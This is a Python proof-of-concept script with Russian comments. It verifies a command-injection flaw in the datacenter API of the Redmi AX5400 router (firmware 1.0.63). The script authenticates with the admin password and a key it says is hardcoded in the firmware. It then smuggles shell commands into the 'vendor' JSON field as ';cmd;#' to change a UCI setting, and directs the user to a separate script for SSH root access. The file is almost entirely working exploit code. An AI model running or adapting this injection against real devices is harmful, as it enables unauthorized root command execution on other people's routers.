#!/usr/bin/env python3
"""
verify_dc7.py — проверка инъекции datacenter7 на Redmi AX5400 (fw 1.0.63)

Подтверждает, что vendor-поле xqdatacenter/request выполняет shell-команды.
Записывает тестовое значение в UCI-параметр diag.config.iperf_test_thr
через инъекцию и считывает его обратно через API.

Ожидаемый результат:
  {"code":-104}  — команда выполнилась (инъекция работает)
  {"code":-1}    — инъекции нет

Использование:
  1. Заполните ROUTER, PASSWORD, DEVICE_ID ниже
  2. python3 verify_dc7.py
"""

import hashlib, time, random, urllib.request, urllib.parse, json

ROUTER    = "192.168.31.1"
PASSWORD  = "ВАШ_ПАРОЛЬ"           # пароль от веб-интерфейса admin
KEY       = "a2ffa5c9be07488bbb04a3a47d3c5f6a"  # захардкожен в прошивке
DEVICE_ID = "xx:xx:xx:xx:xx:xx"    # MAC роутера (с наклейки, нижний регистр)


def sha1(s):
    return hashlib.sha1(s.encode()).hexdigest()


def login():
    nonce = f"0_{DEVICE_ID}_{int(time.time())}_{random.randint(0, 9999)}"
    pwd   = sha1(nonce + sha1(PASSWORD + KEY))
    data  = urllib.parse.urlencode(
        {"username": "admin", "password": pwd, "logtype": "2", "nonce": nonce}
    ).encode()
    resp = json.loads(urllib.request.urlopen(
        urllib.request.Request(
            f"http://{ROUTER}/cgi-bin/luci/api/xqsystem/login",
            data=data, method="POST"),
        timeout=5).read())
    if resp.get("code") != 0:
        raise RuntimeError(f"Login failed: {resp}")
    return resp["token"]


def dc7(token, cmd, timeout=6):
    """Инъекция команды через vendor-поле datacenter API (api=7)."""
    p = json.dumps(
        {"api": 7, "dev": "a", "vendor": f";{cmd};#", "type": "a"},
        separators=(",", ":"))
    url  = f"http://{ROUTER}/cgi-bin/luci/;stok={token}/api/xqdatacenter/request"
    data = urllib.parse.urlencode({"payload": p}).encode()
    try:
        return urllib.request.urlopen(
            urllib.request.Request(url, data=data, method="POST"),
            timeout=timeout).read().decode(errors="replace")
    except Exception as e:
        return f"ERR:{e}"


def get_diag(token):
    url = (f"http://{ROUTER}/cgi-bin/luci/;stok={token}"
           f"/api/xqnetwork/diag_get_paras")
    try:
        return str(json.loads(urllib.request.urlopen(
            urllib.request.Request(url), timeout=5).read()
        ).get("iperf_test_thr", "?"))
    except Exception as e:
        return f"ERR:{e}"


if __name__ == "__main__":
    print("Логин...")
    tok = login()
    print(f"  токен: {tok[:16]}...")

    tok = login()
    before = get_diag(tok)
    print(f"\n[1] iperf_test_thr ДО инъекции: {before}")

    test_val = "77777"
    tok = login()
    r = dc7(tok, f"uci set diag.config.iperf_test_thr={test_val} ; uci commit diag")
    print(f"\n[2] Ответ на инъекцию: {r}")
    time.sleep(1)

    tok = login()
    after = get_diag(tok)
    print(f"\n[3] iperf_test_thr ПОСЛЕ инъекции: {after}")

    if str(after) == test_val:
        print("\n[!!!] ИНЪЕКЦИЯ ПОДТВЕРЖДЕНА — команды выполняются!")
        print("      Запустите root_access.py для получения SSH-доступа.")
    else:
        print("\n[-] Значение не изменилось — инъекция не работает")
        print(f"    before={before}  after={after}")
        print("\n    Возможные причины: другая прошивка, другая модель,")
        print("    неверный KEY или DEVICE_ID.")
